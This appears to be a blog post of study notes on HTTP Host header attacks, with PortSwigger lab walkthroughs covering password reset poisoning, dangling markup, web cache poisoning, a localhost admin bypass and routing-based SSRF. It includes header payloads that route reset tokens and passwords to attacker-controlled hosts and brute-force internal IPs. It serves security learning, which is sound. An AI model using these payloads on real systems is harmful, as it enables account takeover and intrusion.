---
layout: post
title: My Notes on Host Header Attack from Portswigger 
subtitle: Host Header Attack
tags: [host header attack]
---


# HTTP Host Header Attack Basic Notes =>

* If Website Target not handle the value of Host Header un safe way then it is vulnerable to this attack
* If Target website Trusts the Host Header or fails to Validate or escape it properly, then attacker can use this to Inject harmful Payloads that manipulates server-side behaviour
* Attacker can use -> Web Cache Poisoning, Business Logic Flaws in specific Vulnerability, Routing-based SSRF, SQLi etc
* Prevention -> 
	* avoid using the Host header altogether in server-side code
	* Double-check whether each URL really needs to be absolute.
	* Validate host header 
	* Don't Suppoer Additional Headers like -> X-Forwarded-Host

============================================================================

# Testing =>

* Check if we can modify Host Header value and this reach to our desire input => If yes then vulnerable
* Supply an arbitrary, unrecognized domain name via the Host header => Host:attacker.com | evil.com


# Scenarios | Cases =>

###1.

```
Still access to Target website even when we give Unexpected Host Header Value.
Reason -> Server sometimes configured with a default or fallback option in case they receive request for domain names that they don't recognize.
If Default -> Better for us
Here need to study -> what the application does with the Host header and whether this behavior is exploitable?
```

###2.

```
Host Header main part for website -> so tampering with it often mean unable to reach the target application at all.
Front-end Server or Load Balance don't know where to forward this request -> So Resulting give this error -> Invalid Host header
Mean Access via CDN
```

## Techniques for Above Scenario =>

### 1. Checked for flawed Validation ===>

```some websites will validate whether the Host header matches the SNI from the TLS handshake. This doesn't necessarily mean that they're immune to Host header attacks.```

``` Try to understand how the website parses the Host Header```

``` Examples ->

some parsing algorithms will omit the port from the Host header, meaning that only the domain name is validated

If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you reach the target application, while potentially injecting a payload via the port.


Host: vulnerable-website.com:bad-stuff-here



Some try to apply matching logic to allow for arbitrary subdomains -> Then try  to bypass the validation entirely by registering an arbitrary domain name that ends with the same sequence of characters as a whitelisted one:

Host: notvulnerable-website.com


take advantage of a less-secure subdomain that you have already compromised: -> Host: hacked-subdomain.vulnerable-website.com

```

### 2. Send ambiguous requests =>

```The code that validates the host and the code that does something vulnerable with it often reside in different application components or even on separate servers. By identifying and exploiting discrepancies in how they retrieve the Host header, you may be able to issue an ambiguous request that appears to have a different host depending on which system is looking at it.```

a) Inject duplicate Host headers

Host: vulnerable-website.com
Host: bad-stuff-here

```-> Let's say the front-end gives precedence to the first instance of the header, but the back-end prefers the final instance. Given this scenario, you could use the first header to ensure that your request is routed to the intended target and use the second header to pass your payload into the server-side code.```

b) Supply an absolute URL

GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here

```also need to experiment with different protocols. Servers will sometimes behave differently depending on whether the request line contains an HTTP or an HTTPS URL.```

c) Add line wrapping

GET /example HTTP/1.1
 Host: bad-stuff-here
Host: vulnerable-website.com


```The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this```


```can also adapt many HTTP request smuggling techniques to construct Host header attacks.```

### 3. Inject host override headers =>

``` Injecting our Payload via one of several other HTTP Headers```



> GET /example HTTP/1.1
> Host: vulnerable-website.com
> X-Forwarded-Host: bad-stuff-here


`Other Can Use -> `
> X-Host
> X-Forwarded-Server
> X-HTTP-Host-Override
> Forwarded

```
TIP -> In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist. one or more of these headers is enabled by default in some third-party technology that they use.
```

=========================================================================

# Lab Practice Notes =>

## 1. Password reset poisoning =>

``` Password Reset Poisoning technique where an attacker manipulates a vulnerable website to generate Password Reset Link Pointing to a Domain under attacker's control.```

* Can steal the secret token required to reset arbitrary user's password and thus compromise victim's accounts


```
This is like this ==>

* Attacker click on Password Reset Function 
* Vulnerable Target made this request 
    -> POST /password/reset HTTP 1.1 
    -> Host: vul-target.com
* Attacker Manipulate above request to ->
    -> Host: attacker-control-domain-to-get-token-from-vul-target.com
* This goes to victim and when victim click on that link then token will go to Attacker's domain
```

### Steps to Attack =>

* Attacker obtains victim's email address or username and submit a password reset request on their behalf
* Victim receives genuine password reset email directly from website. Domain name in the URL points to the attacker's server -> https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
* Victim clicks on that link and token will be sent to attacker's server
* Attacker  got the token and thus can reset password

```
Even if you can't control the password reset link, you can sometimes use the Host header to inject HTML into sensitive emails. Note that email clients typically don't execute JavaScript, but other HTML injection techniques like dangling markup attacks may still apply.
```

### Lab 1 => Basic password reset poisoning

Here are the steps ->

1. First as a attacker , experiment and observe behavior of password reset functionality with ow creds or own account
2. Change own password using given link from password reset and get token and hence get url of token on own email , so we know the process of password reset
3. Now, change the Host:vul-target.com to Host: bing.com and if it success then show 200 OK
4. Now try to replace bing.com to exploit server of attacker's domain own control
5. Now change username or email in repeater to victim
6. In exploit server log file we can see new token generated
7. In repeater, use that token and replace old one and change password of anything we want
8. Now login with victim username or email and password given by attacker


```
sometimes the server will whitelist the Host header, so we should try various other ways like double host header injection, X-Forwarded-Host injection, and also trying to bypass their whitelist. 
Like in next lab
```

```
extra tip: if the app is built on ruby, try adding a .json extension to the end of the password reset URL
 i've found a bug where I could use this to bypass a 4 digit code that they had for access control and inject host header and get password reset poisining
```

### Lab 2 => Password reset poisoning via middleware

Here are the Steps ->

* Same as above almost
* Here we try an extra HTTP Header -> X-Forwarded-Host: attacker-server-here/exploit
* Now get token and replace with old one for victim and change password and login with that new password of victim



### Lab 3  => Password reset poisoning via dangling markup

First Let's know what is dangling markup ? => https://portswigger.net/web-security/cross-site-scripting/dangling-markup

> a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
> Due to CSP or filtering , if can't do XSS  then can try for Dangling Markup Technique
> example -> `"><img src='//attacker-website.com?`


Here are the Steps ->

1. This time by observing and playing with password reset functionality with own account [Attacker] -> In email no link given for token to reset password
2. This time instead give Link to -> Point to -> Login page and URL Does not contain password reset token
3. Instead "a new password" sent to directly on email body 
4. Now check /email GET request and its Response
5. There on /email Response we saw -> Content of our email is written in string and also there  JS Library using -> DOMPurify
6. In email -> there is an option to view each email as RAW HTML
7. Might be it not sanitized properly
8. Now, from /forgot-password POST Request while changing  Host to Attacker's domain or exploit it will give Server Error
9. But by using "arbitrary port - non-numeric port"  like -> Host: your-lab-id.web-security-academy.net:arbitraryport  -> Trigger a password reset email mean working fine and bypass the server error
10. Now to exploit this we need to change "arbitraryport" to this -> 
  >  '<a href="//your-exploit-server-id.web-security-academy.net/? 

11. Check email client  -> got new email -> Content missing -> Check exploit server and access log -> There is an entry for GET /?/login'>[...] -> this contain rest of the email body -> and also new password
12. Now in Burp Repeater -> Change username to victim and Forward request of /forgot-password and now check exploit server and access log and check for new password and use that and login with that creds to victim account


### Summary  for Passowrd Reset Poisoning attack =>

We can use following ways to perform this attack and bypasses as well

1. Simple Technique =>

> Host: attacker-server.com

2. Indent Spaces Trick =>
>    Host: attacker.com
> Host: vul-target.com

3. Switch Host Trick =>

> Host: vul-target.com
> Host: attacker.com

> OR

> Host: attacker.com
> Host: vul-target.com

4. Trying other Headers as well => Like X-Forwarded-Host etc

> Host:vul-tar.com
> X-Forwarded-Host: attacker.com

Other Headers =>

```
   X-Original-Url:
   X-Forwarded-Server:
   X-Host:
   X-Forwarded-**Host**:
   X-Rewrite-Url:
```

5. Try for random Port as well =>

> Host: attacker.com:1234

> OR

> Host: attacker.com:<non-numeric port like arbitraryport> 

6. Remember Dangling Markup Trick


==============================================================

## 2. Web cache poisoning via the Host header =>

### About Web Cache =>

* Web Server save web page so that it can be reuse and hence increase speed and lessend the load on server
* Like  a copy of a web page serverd by a server
* Sits between Server and User -> It saves -> HTTP Request, Responses for a mixed amount of time.
* If user sends the request, then Server send copy of  cached response which are saved on server without interacting with the backend
* Web Cache Having -> Cache Keys
* Web Cache Care about -> **Host Header** & **Request Line**
* So, Web Caches temporarily store Web Documents like pages,images and other type of information , e.g. -> in meta tag etc



### About Web Cache Poisoning Attack =>

* A method used by attacker to make the clients load **Unexpected** Resources partially or Totally control by Attacker
* If a response is caches in a shared web cache, then all users of that cache will continue to receive the malicious content until the cache entry is expired
* Motive is to send a request that causes a malicious response and gets saved in the cache resulting in malicious content getting served to users.

Ways to do this things -> HTTP Response Splitting, using unkeyed inputs, or by request smuggling



### How to construct Web Cache Poisoning  Attack ? =>

* **Find out unkeyed inputs** -> Tool -> Param Miner
* ** Extract Responses from the backend** 
	* Know how exactly website working
	* Find out an input that is reflecting in the response from the server without any sanitization or is used to dynamically generate other data
	* It all depends on Various factors such as -> file extension, route, status code, response header
	* We must play with Req and Res and Observe the cache until our response gets properly cached
* So, what we need is to play with Host header and inject payload there and see Response for our given input on Host header or what ever we used trick to bypass host header defensing

### Lab Solve =>

* Analyze request and response
* Add Another Host header and input anything there like -> aakash123
* In Response check for "aakash123" which is reflecting on -> <script type="text/javascript" src="//aakash123/resources/js/tracking.js"></script>
* So, js src using for importing tracking.js file
* Now even after remove 2nd Host from Request and forward this request and we can see still given input from previous request reflecting in new response
* So, now we need to make a file "/resources/js/tracking.js" in explot server or attacker's control domain which having injecting payload
* And in Repeater , just add attacker's control domain and repeat this several times until it save on cache and our exploit work



============================================================================

## 3. Exploiting classic server-side vulnerabilities

* We can also try SQLi instead of XSS in Host header attack
* If the value of the header is passed into a SQL statement, this could be exploitable.


### Lab Solve => Host header authentication bypass -> Accessing restricted functionality

* Checked robots.txt and found /admin directory
* While visiting to that directory got that error ->  Admin interface only available to local users 
* To Bypass this issue use this technique -> Change Host to Host: localhost
* Whenever making Request change Host to localhost


===============================================================

## 4. Accessing internal websites with virtual host brute-forcing

``` 
Companies host publicly accessible website, private and internal sites on same server , which is mistake.
Server have both Public + Private IP
Attacker can typically access any virtual host on any server, they can guess hostnames.

Try to discover hidden domain name through Information Disclosure.
Also can bruteforce virtual hosts using wordlist of candidate subdomains.
```

### Routing-based SSRF =>

```possible to use the Host header to launch high-impact, routing-based SSRF attacks. -> Host header SSRF attacks ```

* Classic SSRF Vuln base on XXE or exploitable business logic that sends HTTP req to a URL derived from user-controllable input
* **Routing based SSRF**  relies on exploiting the intermediary components that are prevalent in many cloud-based architectures. 
* include -> in-house load balancers and reverse proxies.
* If this insecurely configured to forward requests based on unvalidated host header, they can be manipulated into misrouting requests to an arbitrary system of the attacker's choice.
* Can use Burp Collaborator to help identify these vulnerabilities
*  If you supply the domain of your Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or another in-path system, this indicates that you may be able to route requests to arbitrary domains.
*  When confirm, next step is to exploit this behavior to access internal-only systems.
*  For this, need to identify private IP Addresses that are in use on the target's internal network.
*  In addition to any IP addresses that are leaked by the application, you can also scan hostnames belonging to the company to see if any resolve to a private IP address.
*  If all else fails, you can still identify valid IP addresses by simply brute-forcing standard private IP ranges, such as 192.168.0.0/16.


###  Lab Solve -> Routing-based SSRF

* First to confirm about this vulnerability -> Go to / page and send to burp request 
* Next from Burp Menu -> Collaborator Client -> Copy to clipboard -> paste in Host header of vulnerable target
* Click to Go on burp repeater -> Now check Burp Collaborator and Click on Poll Now -> There we can see some Network Interaction in the table including HTTP Request
* This CONFIRM that we  are able to make the website's middleware issue requests to an arbitrary server
* Now to get private IP of the target for routing, send to Intruder -> On Host type -> 192.168.0.0 -> Make field in last 0 like -> Host: 192.168.0.§0§
* Payload type -> Number -> from 0 to 255 and 1 at a time -> Start Attack
* From many requests from the result of intruder -> we can see one request -> 302 which is admin
* Now once show response on browser click on delete carlos and we can see not found but using same trick -> Host: 192.168.0.§0§ we got exact IP so we can use that there on Host: Host: 192.168.0.218
* There we can see Get Request and parameter -> csrf and username
* Do same thing as previous -> Change / to path -> /admin/delete and add host -> Host: 192.168.0.218 and also add cookie from previous request and also change req from GET to POST and add csrf and username -> DONE


### Lab ->  SSRF via flawed request parsing =>

* So, this attack almost above type
* Difference is here that in this lab , target is using Absolute Url
* GET /  HTTP 1.1 Host: acd41f1d1ee946af807614e3001500c3.web-security-academy.net
* Instead GET / try to change this / to -> GET https://acd41f1d1ee946af807614e3001500c3.web-security-academy.net/
* And we can see it will give no problem
* But if we omit / from https://acd41f1d1ee946af807614e3001500c3.web-security-academy.net/ to this -> https://acd41f1d1ee946af807614e3001500c3.web-security-academy.net
* We can see it will throw error -> server error
* So, it mean this target having behavior of using Absolute error
* Now we can append things there and try to do same task as previous steps



### SSRF via a malformed request line =>

```
Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.

For example, a reverse proxy might take the path from the request line, prefix it with http://backend-server, and route the request to that upstream URL. This works fine if the path starts with a / character, but what if starts with an @ character instead?

GET @private-intranet/example HTTP/1.1

The resulting upstream URL will be http://backend-server@private-intranet/example, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server.
```
